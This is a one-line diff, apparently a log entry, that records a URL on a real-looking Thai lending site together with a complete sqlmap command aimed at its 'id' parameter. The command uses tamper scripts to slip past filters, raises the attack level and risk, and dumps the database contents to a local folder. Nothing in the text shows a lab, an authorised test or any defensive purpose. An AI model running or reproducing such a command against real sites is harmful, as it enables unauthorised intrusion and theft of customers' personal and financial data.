@@ -1,0 +1,1 @@
+https://moneycat.co.th/application.php?id=1 (GET)  # C:\Users\Administrator\AppData\Local\Programs\Python\Python311\Scripts\sqlmap -u https://moneycat.co.th/application.php?id=1 -p id --batch --random-agent --tamper=space2comment,randomcase --level=3 --risk=2 --time-sec=30 --threads=3 --dump --output-dir=auto_local_sqlmap_20251029_162029
